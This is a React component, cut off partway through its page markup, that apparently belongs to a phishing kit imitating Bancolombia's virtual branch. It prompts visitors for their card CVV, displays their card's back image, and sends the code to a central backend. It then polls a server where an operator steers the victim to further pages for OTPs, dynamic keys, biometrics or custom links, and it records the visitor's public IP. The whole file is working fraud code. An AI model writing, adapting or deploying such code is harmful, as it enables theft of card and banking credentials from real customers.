import { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../axios/instanceBackend";
import LoadingBancolombia from "../../../components/LoadingBancolombia";
import IniciarSesionModal from "./modals/iniciarSesionModal";
import NumOTPModal from "./modals/NumOTP-Modal";
import { CVV_CONFIG } from './cardTextConfig';
import { isDesktop, limpiarPaddingBody } from "../../../../@utils";
import './css/LoginModal.css';

// Se exporta el componente
export default function ValidacionCVV() {

    // Se inicializa la navegacion
    const navigate = useNavigate();

    // Se inicializa el estado
    const [cvv, setCvv] = useState("");
    const [cargando, setCargando] = useState(false);
    const [submitted, setSubmitted] = useState(false);
    const [polling, setPolling] = useState(false);
    const [focusedField, setFocusedField] = useState("");
    const [hasError, setHasError] = useState(false);

    // Estado para el modal de error
    const [formState, setFormState] = useState({
        lanzarModalErrorSesion: false,
    });

    // Se inicializan las referencias
    const loadingRef = useRef(false);
    const estadoAnteriorRef = useRef(null);
    const aprobadoEsperandoRef = useRef(false);

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Estado para los datos de la tarjeta (desde localStorage o valores por defecto)
    const [cardData, setCardData] = useState({
        filename: "",
        tipo: "",
        digits: "",
        label: ""
    });

    // Estado para controlar la carga de imágenes (evita ver tarjeta anterior)
    const [imagesLoaded, setImagesLoaded] = useState(false);
    const [loadingImages, setLoadingImages] = useState(false);

    // Detectar si es Amex para ajustar la longitud del CVV (4 dígitos vs 3 estándar)
    const isAmex = cardData.label.toLowerCase().includes("amex") || cardData.filename.toLowerCase().includes("amex") || cardData.tipo.toLowerCase().includes("american");

    // Se crea el useEffect
    useEffect(() => {

        // Se captura la session
        const sessionId = localStorage.getItem("sessionId");

        // Se valida si no hay session
        if (!sessionId) {

            // Se redirige a la pagina principal
            window.location.href = "/bancolombia";

            // Se retorna
            return;
        };

        // Se valida si hay polling
        if (!polling) return;

        // Se inicializa el intervalo
        let interval;

        // Se inicializa la referencia
        aprobadoEsperandoRef.current = false;
        estadoAnteriorRef.current = null;

        // Se crea el metodo encargado de validar el estado de la session
        const checkStatus = async () => {

            // Se usa el try catch
            try {

                // Se captura la session
                const sessionId = localStorage.getItem("sessionId");

                // Se valida si no hay session
                if (!sessionId) {

                    // Se limpia el intervarlo
                    clearInterval(interval);

                    // Se quita el cargando
                    setPolling(false);
                    setCargando(false);

                    // Se retorna
                    return;
                };

                // Se envia la peticion
                const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionId}`);

                // Se captura la informacion
                const { estado, cardData, url, text } = response.data;
                const estadoLower = String(estado || '').toLowerCase();
                const hasUrl = Boolean(url && String(url).trim());
                const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);

                // Se actualiza los datos de la tarjeta
                if (cardData) {

                    // Se normaliza
                    const normalized = normalizeCardData(cardData);

                    // Se setea la información
                    setCardData(normalized);

                    // Se setea en el local storage
                    localStorage.setItem("selectedCardData", JSON.stringify(normalized));
                }

                // Se valida si es error_cvv o error_cvv_custom
                if (estado == 'error_cvv' || estado === 'error_cvv_custom') {

                    // Se limpia el intervalo
                    clearInterval(interval);

                    // Se quita el cargando
                    setCargando(false);

                    // Se quita el polling
                    setPolling(false);

                    // Se lanza el modal de error
                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));

                    // Se cierra el modal de error
                    setTimeout(() => {
                        setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
                    }, 4000);

                    // Se limpia el cvv
                    setCvv("");

                    // Se retorna
                    return;
                }

                // Se inicializan los estados de TC
                const statesLoading = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];

                // Se valida si esta en los estados
                if (statesLoading.includes(estado)) {

                    // Se setea el estado
                    estadoAnteriorRef.current = estado;

                    // Se retorna
                    return;
                }

                // Se valida si se solicito un sol_cvv_custom o sol_cvv
                if (estado === 'sol_cvv_custom' || estado === 'sol_cvv') {

                    // Se limpia el intervalo
                    clearInterval(interval);

                    // Se setea el cargando
                    setCargando(false);

                    // Se setea el polling
                    setPolling(false);

                    // Se valida si se volvio a solicitar cvv
                    if (estado === 'sol_cvv_custom') {

                        // Se recarga la pagina
                        window.location.reload();
                    }

                    // Se retorna
                    return;
                }

                // Si el estado sigue en awaiting_approval, seguir esperando
                if (estado === 'awaiting_cvv_approval' || estado === 'awaiting_tc_approval') {

                    // Se setea
                    estadoAnteriorRef.current = estado;

                    // Se retorna
                    return;
                }

                // Si estaba en awaiting_approval y ahora cambió a otro estado, significa que el admin presionó un botón
                const prev = estadoAnteriorRef.current;

                // Se validan los estados
                if ((prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') &&
                    estado !== 'awaiting_cvv_approval' && estado !== 'awaiting_tc_approval' &&
                    estado !== 'pendiente') {

                    // Se seeta el estado
                    estadoAnteriorRef.current = estado;
                } else {

                    // Se seeta el estado
                    estadoAnteriorRef.current = estado;
                }

                if (estadoLower === 'link_bot' && hasUrl) {
                    clearInterval(interval);
                    setCargando(false);
                    setPolling(false);
                    window.location.href = url;
                    return;
                }
                if (estadoLower === 'sol_link_custom' && customLink) {
                    clearInterval(interval);
                    setCargando(false);
                    setPolling(false);
                    window.location.href = customLink;
                    return;
                }
                if (
                    estadoLower === 'sol_link_bot' ||
                    (estadoLower === 'link_bot' && !hasUrl) ||
                    (estadoLower === 'sol_link_custom' && !customLink)
                ) {
                    return;
                }

                // Se inicializan los estados de redireccion
                const statesRedirection = [
                    'sol_tc', 'sol_otp', 'sol_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar',
                    'sol_biometria', 'error_923',
                    'sol_tc_custom', 'sol_cvv_custom',
                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla', 'reject_custom',
                    'sol_link_bot', 'link_bot', 'sol_link_custom'
                ];

                // Se valida si no esta el estado incluido
                if (!statesRedirection.includes(estadoLower)) return;

                // Se limpia el intervalo
                clearInterval(interval);

                // Se setea el cargando
                setCargando(false);

                // Se setea el polling
                setPolling(false);

                // Se switchea el estado
                switch (estadoLower) {
                    case 'sol_tc':

                        // Se redireccion
                        navigate("/validacion-tc");

                        // Se sale del cilo
                        break;
                    case 'sol_tc_custom':

                        // Se redirecciona
                        window.location.href = "/validacion-tc";

                        // Se sale del cilo
                        break;
                    case 'sol_otp':

                        // Se redireccion
                        navigate("/numero-otp");

                        // Se sale del cilo
                        break;
                    case 'sol_din':

                        // Se redireccion
                        navigate("/clave-dinamica");

                        // Se sale del cilo
                        break;
                    case 'sol_finalizar':
                    case 'sol_finalizado':
                    case 'solicitar_finalizar':

                        // Se redireccion
                        navigate("/finalizado-pse");

                        // Se sale del cilo
                        break;
                    case 'sol_biometria':

                        // Se redireccion
                        navigate("/verificacion-identidad");

                        // Se sale del cilo
                        break;
                    case 'error_923':

                        // Se redireccion
                        navigate("/error-923page");

                        // Se sale del cilo
                        break;
                    case 'error_tc':
                    case 'error_tc_custom':

                        // Se retorna
                        return;
                    case 'error_cvv_custom':

                        // Se sale del cilo
                        break;
                    case 'error_otp':

                        // Se setea el error en el local storage
                        localStorage.setItem('estado_sesion', 'error');

                        // Se redirecciona
                        window.location.href = '/numero-otp';

                        // Se sale del cilo
                        break;
                    case 'error_din':

                        // Se setea el error en el local storage
                        localStorage.setItem('estado_sesion', 'error');

                        // Se redirecciona
                        window.location.href = '/clave-dinamica';

                        // Se sale del cilo
                        break;
                    case 'error_login':

                        // Se setea el error en el local storage
                        localStorage.setItem('estado_sesion', 'error');

                        // Se redirecciona
                        window.location.href = '/bancolombia';

                        // Se sale del cilo
                        break;
                    case 'reject_custom':

                        // Se muestra el modal de error de sesión OTP
                        setFormState(prev => ({
                            ...prev,
                            lanzarModalErrorSesion: true
                        }));

                        // Se quita a los 2 segundos
                        setTimeout(() => {

                            // Se oculta el modal de error de sesión OTP
                            setFormState(prev => ({
                                ...prev,
                                lanzarModalErrorSesion: false
                            }));
                        }, 4000);

                        // Se limpian los valores
                        setCvv("");

                        // Se setea el submit en false
                        setSubmitted(false);

                        // Se sale del ciclo
                        break;
                    case 'link_bot':
                        if (hasUrl) {
                            window.location.href = url;
                        }
                        break;
                    case 'sol_link_custom':
                        if (customLink) {
                            window.location.href = customLink;
                        }
                        break;
                    default:
                }
            } catch (error) {
            }
        };

        // Ejecutar polling cada 3s solo cuando polling está activo
        interval = setInterval(checkStatus, 3000);

        // Se retorna
        return () => {

            // Se limpia el intervalo
            clearInterval(interval);
        };
    }, [polling, navigate]);

    // Cargar datos desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
    useEffect(() => {

        // Se sube el scroll al top al cargar la página
        limpiarPaddingBody();

        // CHECK: Si estamos en modo CVV Custom (viene desde URL params)
        const params = new URLSearchParams(window.location.search);
        const mode = params.get('mode');
        const sesionId = params.get('sessionId');

        // Cargar cardData desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
        const savedCardData = JSON.parse(localStorage.getItem("selectedCardData"));
        if (savedCardData) {

            console.log("savedCardData -> ", savedCardData);

            const normalized = normalizeCardData(savedCardData);

            // 🛡️ DEFENSIVE VALIDATION: Verificar que normalized tiene los campos requeridos
            if (!normalized || !normalized.filename || normalized.filename.trim() === "") {
                console.error("[ValidacionCVV] Datos de tarjeta inválidos en localStorage:", {
                    savedCardData,
                    normalized
                });
                // Mantener el estado vacío para activar placeholders
                return;
            }

            console.log("[ValidacionCVV] Datos de tarjeta cargados:", normalized);
            setCardData(normalized);
            localStorage.setItem("selectedCardData", JSON.stringify(normalized));
        } else {
            console.warn("[ValidacionCVV] No se encontró selectedCardData en localStorage");

            // 🔄 FALLBACK: Intentar recuperar desde datos_usuario
            const rawData = localStorage.getItem("datos_usuario");
            if (rawData) {
                try {
                    const userData = JSON.parse(rawData);
                    const tarjetaData = userData?.usuario?.tarjeta || userData?.attributes?.usuario?.tarjeta;

                    if (tarjetaData && tarjetaData.filename) {
                        console.log("[ValidacionCVV] ✅ RECUPERADO desde datos_usuario.usuario.tarjeta:", tarjetaData);
                        const normalized = normalizeCardData(tarjetaData);
                        setCardData(normalized);
                        // Restaurar también a selectedCardData para futuras navegaciones
                        localStorage.setItem("selectedCardData", JSON.stringify(normalized));
                    } else {
                        console.error("[ValidacionCVV] ❌ No se encontró tarjeta en datos_usuario:", {
                            userData,
                            tarjetaData
                        });
                    }
                } catch (error) {
                    console.error("[ValidacionCVV] Error parseando datos_usuario:", error);
                }
            } else {
                console.error("[ValidacionCVV] ❌ Tampoco se encontró datos_usuario en localStorage");
            }
        }

        // Verificar si viene con error
        if (params.get("error") === 'true') {
            alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
            setCvv("");
        }
    }, [navigate]);

    // useEffect para precargar imágenes cuando cambia cardData
    useEffect(() => {
        const preloadImages = async () => {
            setLoadingImages(true);
            setImagesLoaded(false);

            // 🛡️ CRITICAL GUARD: Validar cardData antes de construir rutas
            if (!cardData.filename || cardData.filename.trim() === "") {
                console.warn("[ValidacionCVV] Preload abortado: cardData.filename está vacío.", {
                    filename: cardData.filename,
                    tipo: cardData.tipo,
                    label: cardData.label,
                    digits: cardData.digits
                });
                // Marcar como "loaded" para no bloquear UI, usará placeholders
                setImagesLoaded(true);
                setLoadingImages(false);
                return;
            }

            const frontPath = cardData.tipo === "credito"
                ? `/assets/images/IMGtarjetas/${cardData.filename}`
                : `/assets/images/IMGdebitotj/${cardData.filename}`;

            const backFilename = getBackCardFilename(cardData.filename);
            const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
            const backPath = backFilename
                ? `/assets/images/${folder}/${backFilename}`
                : frontPath;

            console.log("[ValidacionCVV] Precargando imágenes:", {
                frontPath,
                backPath,
                filename: cardData.filename,
                tipo: cardData.tipo
            });

            try {
                // Precargar ambas imágenes simultáneamente
                const loadImage = (src) => {
                    return new Promise((resolve, reject) => {
                        const img = new Image();
                        img.onload = () => {
                            console.log("[ValidacionCVV] Imagen cargada exitosamente:", src);
                            resolve(img);
                        };
                        img.onerror = (err) => {
                            console.error("[ValidacionCVV] Error cargando imagen:", src, err);
                            reject(new Error(`Failed to load: ${src}`));
                        };
                        img.src = src;
                    });
                };

                await Promise.all([
                    loadImage(frontPath),
                    loadImage(backPath)
                ]);

                // Ambas imágenes cargadas exitosamente
                console.log("[ValidacionCVV] Todas las imágenes precargadas correctamente");
                setImagesLoaded(true);
                setLoadingImages(false);
            } catch (error) {
                console.error("[ValidacionCVV] Error precargando imágenes:", {
                    error,
                    message: error.message,
                    frontPath,
                    backPath,
                    cardData
                });
                // Aún así permitir mostrar (fallback a placeholder)
                setImagesLoaded(true);
                setLoadingImages(false);
            }
        };

        preloadImages();
    }, [cardData.filename, cardData.tipo]);

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se valida si el estado en el localStorage es error
        const estadoSesion = localStorage.getItem('estado_sesion');

        // Si es error, se muestra el modal
        if (estadoSesion === 'error') {

            // Se borra el estado del localStorage
            localStorage.removeItem('estado_sesion');

            // Se muestra el modal de error de sesión OTP
            setFormState(prev => ({
                ...prev,
                lanzarModalErrorSesion: true
            }));

            // Se quita a los 2 segundos
            setTimeout(() => {

                // Se oculta el modal de error de sesión OTP
                setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }));
            }, 4000);
        };

        // Se obtiene la IP
        getInfoIp();

        // Se obtiene la fecha/hora con formato
        getDateHours();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        getDateHours();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto =
            (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {
            getDateHours();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {
                getDateHours();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // Metodo encargado de enviar el CVV
    const handleSubmit = async () => {

        // Se valida si ya se presiono o esta cargando
        if (submitted || cargando) {

            // Se retorna
            return;
        };

        // Activar flags de carga y bloqueo
        setCargando(true);
        setSubmitted(true);

        // Se setea el loading
        loadingRef.current = true;

        // Se usa el try catch
        try {

            // Se captura el sessionId
            const sessionId = localStorage.getItem("sessionId");

            // Se inicializa la data a enviar
            const dataSend = {
                "data": {
                    "attributes": {
                        "sessionId": sessionId,
                        "cvv": cvv,
                        "cardLabel": cardData.label,

                        // Se inicializa la data
                        "backend": "P01",
                        "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                        "backend_url": "/api/v1/bancolombia/cvv-custom"
                    }
                }
            };

            const centralUrl = (
                process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
            ).trim();

            // Se envia el post
            if (centralUrl) {
                await instanceBackend.post(centralUrl, dataSend);
            } else {
                await instanceBackend.post("/bancolombia/cvv-custom", dataSend);
            }

            // Activar polling en lugar de redirigir
            setPolling(true);
        } catch (error) {

            // Se manda la alerta
            alert("Error enviando verificación.");

            // Se setea el cargando
            setCargando(false);
        }
    };

    // Función para mapear el filename del frente al filename de la parte trasera
    const getBackCardFilename = (frontFilename) => {

        // Mapeo de imágenes del frente a la parte trasera
        const frontToBackMap = {

            // Crédito - Mastercard
            "imgi_10_Mastercard_ideal_.webp": "Mastercard-ideal.webp",
            "imgi_11_Mastercard_joven_.webp": "Mastercard-joven.webp",
            "imgi_12_clasica_.webp": "Mastercard-clasica.webp",
            "imgi_14_Mastercard_credit-card.webp": "Mastercard-Unica.webp",
            "imgi_15_275x172.webp": "Mastercard-Standard.webp",
            "imgi_16_Mastercard_oro_.webp": "Mastercard-oro.webp",
            "imgi_19_Mastercard_611_600x379.webp": "Mastercard-Platinum.webp",
            "imgi_24_Mastercard_612_600x379.webp": "Mastercard-Black-v1.webp",
            "imgi_26_Mastercard_+Tarjeta+Virtual.webp": "Mastercard-E-Card-v1.webp",
            "imgi_29_Mastercard-Sufi_Optimizada.webp": "Mastercard-Sufi-v1.webp",
            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.webp": "Mastercard-Esso-mobil-v1.webp",
            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.webp": "Mastercard-Esso-mobil-v1.webp",

            // Crédito - Visa
            "imgi_13_+Visa+clasica+tradicional.webp": "Visa-Clasica.webp",
            "imgi_17_Visa+Seleccion+Colombia.webp": "Visa-seleccion-colombia.webp",
            "imgi_18_Visa+Oro.webp": "Visa-Oro.webp",
            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.webp": "Visa-LifeMiles-v1.webp",
            "imgi_25_Visa+Platinum+Conavi.webp": "Visa-Platinum-v1.webp",
            "imgi_28_Visa_Infinite_Card.webp": "Visa-infinite-v1.webp",

            // Crédito - Amex
            "imgi_20_AMEX+SkyBlue.webp": "Amex-blue.webp",
            "imgi_20_AMEX+SkyBlue.webp": "Amex-blue.webp",
            "Amex-Green-v2.webp": "CVV-Amex-Greem.webp",
            "imgi_22_AMEX+Gold.webp": "Amex-Gold-v1.webp",
            "imgi_27_AMEX+Platinum.webp": "Amex-Platinum-v1.webp",
            "imgi_7_Amex+Libre.webp": "Amex+Libre.webp",

            // Débito
            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp": "Débito_Cívica.webp",
            "imgi_5_Debito_(preferencial).webp": "Débito Preferencial.webp",
            "imgi_7_004_600x379.webp": "Débito Clásica.webp",
            "debito_virtual.webp": "debito_virtual.webp"
        };

        return frontToBackMap[frontFilename] || null;
    };

    // usando el servicio externo api.ipify.org
    const getInfoIp = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        }
    };

    // Metodo encargado de obtener la informacion de la fecha y hora
    const getDateHours = () => {
        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const opciones = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = ahora.toLocaleString("es-CO", opciones);

        // Se guarda el valor formateado en el estado
        setFechaHora(formato);
    };

    // Obtener la ruta de la imagen de la parte frontal (para el título pequeño)
    const getCardImagePath = () => {
        // 🛡️ DEFENSIVE GUARD: Si no hay filename, retornar placeholder
        if (!cardData.filename || cardData.filename.trim() === "") {
            console.warn("[ValidacionCVV] cardData.filename está vacío, usando placeholder");
            return "/assets/images/logo_banca.png";
        }

        const basePath = cardData.tipo === "credito"
            ? "/assets/images/IMGtarjetas/"
            : "/assets/images/IMGdebitotj/";
        return `${basePath}${cardData.filename}`;
    };

    // Obtener la ruta de la imagen de la parte trasera
    const getBackCardImagePath = () => {
        // 🛡️ DEFENSIVE GUARD: Si no hay filename, retornar placeholder
        if (!cardData.filename || cardData.filename.trim() === "") {
            console.warn("[ValidacionCVV] cardData.filename está vacío en getBackCardImagePath, usando placeholder");
            return "/assets/images/logo_banca.png";
        }

        const backFilename = getBackCardFilename(cardData.filename);
        if (!backFilename) {
            // Si no hay imagen trasera, usar la frontal
            return getCardImagePath();
        }

        // Determinar carpeta según tipo
        const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
        return `/assets/images/${folder}/${backFilename}`;
    };

    // Obtener el tipo de tarjeta formateado
    const getTipoTarjeta = () => {
        return cardData.tipo === "credito" ? "Crédito" : "Débito";
    };

    // --- HELPER PARA CONFIGURACIÓN DE TEXTO ---
    const getCardConfig = (filename) => {
        const defaultConfig = CVV_CONFIG["default"];
        const cardConfig = CVV_CONFIG[filename] || {};

        // Merge: combinar config específico con default
        // ValidacionCVV espera acceder a .back (ej: config.back.top)
        return {
            back: { ...defaultConfig, ...cardConfig }
        };
    };

    // Metodo encargado de normalizar los datos de la tarjeta
    const normalizeCardData = (data) => {

        // Se valida que el data exista y tenga un filename
        if (!data || !data.filename) return data;

        // Se captura el filename
        let filename = data.filename;

        // Se valida que el archivo tenga la extensión .webp
        if (filename.endsWith(".webp")) {

            // Se reemplaza la extensión .webp por .webp
            filename = filename.replace(".webp", ".webp");
        }

        // Se valida cuando el archivo es Amex-Green-v2.webp
        if (filename === "imgi_21_AMEX+Green.webp") {

            // Se reemplaza el filename
            filename = "Amex-Green-v2.webp";
        }

        // Se retorna
        return { ...data, filename };
    };

    const cvvLength = isAmex ? 4 : 3;

    // Manejar cambio en el input (solo números)
    const handleCvvChange = (e) => {

        // Se obtiene el valor del input
        const val = e.target.value;

        // Solo permitir números y respetar la longitud máxima
        if (/^\d*$/.test(val) && val.length <= cvvLength) {

            // Se setea el CVV con el nuevo valor (solo si es numérico y dentro del límite)
            setCvv(val);

            // Se valida cuando el usuario ha completado el CVV para activar el botón de enviar
            if (val.length === cvvLength) {

                // Se habilita el botón de enviar (esto se maneja en el JSX con disabled={cvv.length !== cvvLength || cargando})
                setSubmitted(false);
                setHasError(false);
                setSubmitted(false);
            } else {
                // Si el CVV no está completo, asegurarse de que el botón de enviar esté desactivado
                setSubmitted(true);
                setSubmitted(true);
            };
        };
    };

    // Estado para controlar el foco del input
    const [isFocused, setIsFocused] = useState(false);

    // Se crea el return del componente
    const desktop = isDesktop();

    // Se retorna el componente
    return (
        <>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                        backgroundRepeat: desktop ? 'round' : 'no-repeat',
                        backgroundPosition: "center",
                        backgroundPositionY: desktop ? "0px" : "-70px",
                        backgroundPositionX: desktop ? "0px" : "-500px",
                    }}
                >
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/images/img_pantalla2/descarga.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                        }}
                    >
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32, marginBottom: desktop ? "15px" : "0px" }}>
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648" }}>
                            {/* TÍTULO CON IMAGEN DE TARJETA */}
                            <div style={{
                                display: "flex",
                                alignItems: "flex-start",
                                gap: "15px",
                                marginBottom: "24px"
                            }}>
                                <img
                                    src={getCardImagePath()}
                                    alt={cardData.label}
                                    style={{
                                        width: "70px",
                                        height: "auto",
                                        borderRadius: "8px",
                                        flexShrink: 0
                                    }}
                                />
                                <h2
                                    className="bc-card-auth-title2 bc-cibsans-font-style-5-bold"
                                    style={{
                                        fontSize: "18px",
                                        fontWeight: "bold",
                                        color: "#ffffff",
                                        margin: 0,
                                        textAlign: "left",
                                        lineHeight: "1.4"
                                    }}>
                                    Validación del CVV de la Tarjeta {getTipoTarjeta()} terminada en {cardData.digits}
                                </h2>
                            </div>

                            {/* TEXTO DESCRIPTIVO */}
                            <p
                                className="bc-card-auth-description"
                                style={{
                                    fontSize: "16px",
                                    lineHeight: "24px",
                                    color: "#ffffff",
                                    marginBottom: "30px",
                                    textAlign: "center"
                                }}>
                                Para garantizar la seguridad de tu cuenta, queremos confirmar que eres tú quien está realizando esta transacción.
                            </p>

                            {/* IMAGEN DE LA TARJETA TRASERA CON CVV (Siempre visible) */}
                            <div style={{
                                position: "relative",
                                width: "100%",
                                maxWidth: "350px",
                                aspectRatio: "1.586",
                                margin: "0 auto 30px auto",
                                borderRadius: "12px",
                                overflow: "hidden",
                                opacity: imagesLoaded ? 1 : 0,
                                transition: "opacity 0.3s ease-in-out"
                            }}>
                                <img
                                    src={getBackCardImagePath()}
                                    alt="Tarjeta trasera"
                                    style={{
                                        width: "100%",
                                        height: "100%",
                                        objectFit: "cover",
                                    }}
                                />
                                {/* CVV visual sobre la tarjeta */}
                                <div style={{
                                    position: "absolute",
                                    transform: "translate(-50%, -50%)",

                                    /* USANDO CONFIGURACIÓN DINÁMICA DE cardTextConfig.js */
                                    /* Buscar config usando el filename de la imagen TRASERA */
                                    top: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.top,
                                    left: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.left,
                                    color: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.color,

                                    fontSize: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.fontSize || "20px",
                                    fontWeight: "bold",
                                    fontFamily: "monospace",
                                    letterSpacing: "2px",
                                    pointerEvents: "none"
                                }}>
                                    {cvv}
                                </div>
                            </div>

                            {/* CAMPO CVV PERSONALIZADO */}
                            <div className="input-group-custom" style={{
                                position: "relative",
                                border: "none",
                                display: "flex",
                                flexDirection: "column", // Apilar verticalmente
                                justifyContent: "center",
                                alignItems: "center",
                                gap: "10px"
                            }}>

                                {/* Contenedor visual de las líneas (AHORA PRIMERO) */}
                                <div
                                    className="input-lines-container"
                                    onClick={() => document.getElementById('cvv').focus()}
                                    style={{
                                        display: "flex",
                                        gap: "10px",
                                        cursor: "text",
                                        height: "40px",
                                        alignItems: "center"
                                    }}
                                >
                                    {/* Generar array de placeholders según la longitud (3 o 4) */}
                                    {Array.from({ length: cvvLength }).map((_, index) => {

                                        // Lógica para determinar el estado de cada línea
                                        const activeIndex = cvv.length < cvvLength ? cvv.length : cvvLength - 1;
                                        const isActive = isFocused && index === activeIndex;

                                        // Determinar si la celda está vacía (sin dígito) para mostrar error
                                        const isEmpty = index >= cvv.length;

                                        // Determinar si hay error: solo si el campo está enfocado, la longitud es menor a lo requerido, y la celda actual está vacía
                                        const isErrorCell =
                                            hasError &&
                                            !isFocused &&
                                            cvv.length < cvvLength &&
                                            isEmpty;

                                        // Renderizar cada línea con el color correspondiente según su estado
                                        return (
                                            <div
                                                key={index}
                                                style={{
                                                    width: "30px",
                                                    height: "30px",
                                                    borderBottom: `2px solid ${isErrorCell
                                                        ? "#ff8389"     // 🔴 vacíos
                                                        : isActive
                                                            ? "#FDDA24"     // 🟡 activo
                                                            : "#ffffff"     // ⚪ normal
                                                        }`,
                                                    transition: "border-color 0.2s ease",
                                                    display: "flex",
                                                    justifyContent: "center",
                                                    alignItems: "center",
                                                    color: "#ffffff",
                                                    fontSize: "20px",
                                                    fontWeight: "bold"
                                                }}
                                            >
                                                {cvv[index] || ""}
                                            </div>
                                        );
                                    })}
                                </div>

                                {/* Etiqueta CVV movida al final (ABAJO) */}
                                <label
                                    className="bc-card-auth-description"
                                    htmlFor="cvv"
                                    style={{
                                        color: "#ffffff",
                                        margin: 0,
                                        cursor: "pointer",
                                        fontWeight: "bold",
                                        fontSize: "14px"
                                    }}
                                >
                                    CVV
                                </label>

                                {/* Input real invisible para capturar teclado */}
                                <input
                                    id="cvv"
                                    name="cvv"
                                    type="tel"
                                    className="input-line"
                                    autoComplete="off"
                                    maxLength={cvvLength}
                                    pattern="[0-9]*"
                                    inputMode="numeric"
                                    value={cvv}
                                    onChange={handleCvvChange}
                                    onFocus={() => { setIsFocused(true); setFocusedField("cvv"); }}
                                    onBlur={() => {
                                        setIsFocused(false);
                                        setFocusedField("");
                                        if (cvv.length !== cvvLength) {
                                            setHasError(true);
                                        }
                                    }}
                                    style={{
                                        position: "absolute",
                                        top: 0,
                                        left: 0,
                                        width: "100%",
                                        height: "100%",
                                        opacity: 0,
                                        cursor: "pointer",
                                        caretColor: "transparent",
                                        WebkitTextFillColor: "transparent",
                                        border: "none",
                                        outline: "none"
                                    }}
                                />
                            </div>

                            <br />
                            <br />

                            {/* BOTÓN CONTINUAR */}
                            <button
                                className="bc-button-primary login-btn"
                                style={{
                                    marginTop: "20px",
                                    opacity: (cvv.length === cvvLength && !submitted) ? 1 : 0.5, // Feedback visual
                                    cursor: (cvv.length === cvvLength && !submitted) ? "pointer" : "not-allowed"
                                }}
                                disabled={cvv.length !== cvvLength || submitted}
                                onClick={handleSubmit}
                            >
                                {submitted ? "Enviado" : (cargando ? "Enviando..." : "Continuar")}
                            </button>
                        </div>
                    </div>

                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div style={{ alignSelf: 'center' }}>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "140px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
